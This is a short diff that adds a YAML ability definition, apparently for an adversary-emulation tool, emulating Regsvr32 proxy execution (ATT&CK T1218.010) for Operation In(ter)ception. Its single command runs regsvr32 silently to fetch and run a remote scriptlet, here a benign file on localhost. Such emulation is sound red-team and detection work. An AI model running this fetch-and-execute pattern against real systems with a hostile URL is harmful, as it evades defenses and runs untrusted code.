@@ -1,0 +1,14 @@
+- id: f54a1e3f-2a76-440f-ac0e-6f5212ec8293
+  name: Regsvr32 Execution
+  description: Emulation of Regsvr32 Execution for Operation In(ter)ception
+  tactic: defense-evasion
+  technique:
+    attack_id: T1218.010
+    name: "System Binary Proxy Execution: Regsvr32"
+  platforms:
+    windows:
+      cmd:
+        command: |
+          regsvr32.exe /s /u /i:http://127.0.0.1/benign.sct scrobj.dll
+  repeatable: false
+  requirements: []
